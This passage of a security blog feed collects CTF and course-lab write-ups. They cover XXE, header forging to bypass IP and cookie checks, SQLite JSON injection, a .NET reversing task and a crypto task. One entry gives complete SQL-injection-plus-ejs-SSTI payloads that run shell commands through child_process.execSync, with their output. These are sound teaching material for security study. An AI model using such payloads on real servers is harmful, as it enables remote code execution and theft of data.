&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</guid><description>&lt;h1 id="simple-web-0x24lab---how2http">
 Simple Web 0x24(Lab - how2http)
 &lt;a class="anchor" href="#simple-web-0x24lab---how2http">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">include&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;flag.php&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">elseif&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($_COOKIE[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Not admim&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>( $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REQUEST_METHOD&amp;#34;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;FLAG&amp;#34;&lt;/span> ) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;u don&amp;#39;t need flag?&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($ip &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">echo&lt;/span> $FLAG;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;NOPE!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>主要是參考之前寫過的&lt;a href="https://hackmd.io/@SBK6401/B135SD0w2">PicoCTF - Who are you?&lt;/a>和&lt;a href="https://hackmd.io/@SBK6401/Syct_Ol0i#Challenge-picobrowser%F0%9F%8D%B0">PicoCTF - Who are you?&lt;/a>，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/H14qGKvrp.png" alt="圖片" />&lt;/p></description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</guid><description>&lt;h1 id="simple-web-0x412023-hw---double-injection---flag1">
 Simple Web 0x41(2023 HW - Double Injection - FLAG1)
 &lt;a class="anchor" href="#simple-web-0x412023-hw---double-injection---flag1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler init-db.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;fs&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;sqlite3&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">verbose&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">FLAG1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">readFileSync&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/flag1.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;utf8&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">trim&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span>.&lt;span style="color:#a6e22e">Database&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/etc/db.sqlite3&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">db&lt;/span>.&lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DROP TABLE IF EXISTS users;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">CREATE TABLE db (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> users JSON NOT NULL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">INSERT INTO db(users) VALUES (&amp;#39;{
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;admin&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;admin&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">FLAG1&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> },
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;guest&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;guest&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;guest&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> }
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">}&amp;#39;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">`&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler Dockerfile&lt;/p></description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</guid><description>&lt;h1 id="simple-web-0x422023-hw---double-injection---flag2">
 Simple Web 0x42(2023 HW - Double Injection - FLAG2)
 &lt;a class="anchor" href="#simple-web-0x422023-hw---double-injection---flag2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Node JS ejs SSTI&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
&lt;img src="https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png" alt="" />
基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- #
&lt;/code>&lt;/pre>&lt;p>後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看&lt;a href="https://hackmd.io/@SBK6401/HkgkDNsPp">之前寫的文章&lt;/a>&lt;/p>
&lt;h2 id="exploit---ejs-ssti-rce">
 Exploit - Ejs SSTI RCE
 &lt;a class="anchor" href="#exploit---ejs-ssti-rce">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload 1:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;ls -al /&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result:
&lt;pre tabindex="0">&lt;code>total	76	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	
-rwxr-xr-x	1	root	root	0		Dec	18	18:54	.dockerenv	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	
drwxr-xr-x	5	root	root	340		Dec	18	18:54	dev	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	
-rw-r--r--	1	root	root	28		Dec	18	17:15	flag1.txt	
-rw-r--r--	1	root	root	23		Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	
drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	
drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	
dr-xr-xr-x	497	root	root	0		Dec	18	18:54	proc	
drwx------	1	root	root	4096	Dec	11	18:36	root	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	
dr-xr-xr-x	13	root	root	0		Dec	18	18:54	sys	
drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	
drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	
drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Payload 2:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;cat /flag2-1PRmDsTXoo3uPCdq.txt&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/p></description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</guid><description>&lt;h1 id="simple-welcome---0x04lab---script">
 Simple Welcome - 0x04(Lab - Script)
 &lt;a class="anchor" href="#simple-welcome---0x04lab---script">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://pyscript.ctf.zoolab.org/">https://pyscript.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 if(!isset($_FILES[&amp;#34;file&amp;#34;]))
 highlight_file(__file__) &amp;amp;&amp;amp; die();
 $flag = file_get_contents(&amp;#39;/flag&amp;#39;);
 $node = @`node {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 $python = @`python3 {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 if($flag === $node &amp;amp;&amp;amp; $flag === $python)
 echo &amp;#39;Here is your Flag: &amp;#39;.$flag;
 else
 echo &amp;#39;Fail :(&amp;#39;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;p>Must write a script that can be executed in python and node language simultaneously.&lt;/p></description></item><item><title>Simple Welcome 0x01(Lab - Let's meet at class)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/</guid><description>&lt;h1 id="simple-welcome-0x01lab---lets-meet-at-class">
 Simple Welcome 0x01(Lab - Let&amp;rsquo;s meet at class)
 &lt;a class="anchor" href="#simple-welcome-0x01lab---lets-meet-at-class">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>Crypto part of homework 0. The key space is $10^{15}$. I used my supercomputer(i5 7th gen) to solve it in about 10 minutes. It&amp;rsquo;s impossible for you guys to enumerate all the keys in 2 weeks, or maybe you can&amp;hellip; (Use &lt;code>pip3 install pycryptodome&lt;/code> to install Crypto)&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> math
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>FLAG &lt;span style="color:#f92672">+=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">128&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>keys &lt;span style="color:#f92672">=&lt;/span> [pow(random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (i&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) ), &lt;span style="color:#ae81ff">65537&lt;/span>, p) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">5&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enc &lt;span style="color:#f92672">=&lt;/span> flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">5&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enc &lt;span style="color:#f92672">=&lt;/span> enc &lt;span style="color:#f92672">*&lt;/span> keys[i] &lt;span style="color:#f92672">%&lt;/span> p
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hint &lt;span style="color:#f92672">=&lt;/span> keys[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">4&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;p =&amp;#39;&lt;/span>, p)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;enc =&amp;#39;&lt;/span>, enc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;hint =&amp;#39;&lt;/span>, hint)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler&lt;/p></description></item><item><title>Simple Welcome 0x02 &amp; 0x05(Lab - Nine &amp; Nine-Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/</guid><description>&lt;h1 id="simple-welcome-0x02--0x05lab---nine--nine-revenge">
 Simple Welcome 0x02 &amp;amp; 0x05(Lab - Nine &amp;amp; Nine-Revenge)
 &lt;a class="anchor" href="#simple-welcome-0x02--0x05lab---nine--nine-revenge">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.tutorialspoint.com/convert-frombase64string-string-method-in-chash#">Convert.FromBase64String(String) Method in C#&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.string.substring?view=net-7.0">String.Substring 方法&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler C# From dnSpy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Nine.Stage&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Token: 0x0600000D RID: 13 RVA: 0x00002694 File Offset: 0x00000894&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Flag()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">this&lt;/span>.font = &lt;span style="color:#66d9ef">new&lt;/span> Font(&lt;span style="color:#66d9ef">this&lt;/span>.fontFamily, &lt;span style="color:#ae81ff">35f&lt;/span>, FontStyle.Regular);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">byte&lt;/span>[] array = Convert.FromBase64String(&lt;span style="color:#e6db74">&amp;#34;LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=&amp;#34;&lt;/span>.Replace(&lt;span style="color:#e6db74">&amp;#34;pui&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>).Substring(&lt;span style="color:#ae81ff">1&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i = &lt;span style="color:#ae81ff">0&lt;/span>; i &amp;lt; array.Length; i++)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		array[i] ^= &lt;span style="color:#ae81ff">135&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">this&lt;/span>.SetMessageBox(Encoding.UTF8.GetString(array));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>起手式一定用DIE或其他檢測tool看一下是用哪種東西編譯或有沒有加殼
&lt;img src="https://hackmd.io/_uploads/SksyjD8K3.png" alt="" />
我一開始以為可以用IDA之類的東西反編譯他，但是顯然IDA沒辦法解析&lt;code>.NET&lt;/code> file，這一題也是看了別人的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>才知道有&lt;a href="https://github.com/dnSpy/dnSpy/releases">dnSpy&lt;/a>這東西可以用
&lt;img src="https://hackmd.io/_uploads/rkiIiwUK3.png" alt="" />&lt;/li>
&lt;li>執行程式
